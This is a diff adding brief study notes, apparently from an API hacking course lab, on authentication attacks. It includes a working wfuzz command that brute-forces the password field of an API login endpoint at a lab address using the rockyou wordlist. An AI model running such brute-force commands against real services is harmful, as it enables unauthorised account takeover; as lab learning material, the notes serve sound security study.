@@ -1,0 +1,11 @@
+Class Auth Attacks
+if the API uses basic authentication across
+the API, a username and password would have to be issued with every
+request. 
+
+fine-tune your brute-force attack is to generate
+passwords specific to your target.
+
+Passowrd Brute force attacls
+wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' --hc 405 -H 'Content-Type: application/
+json' -z file,/home/hapihacker/rockyou.txt http://192.168.195.130:8888/api/v2/auth
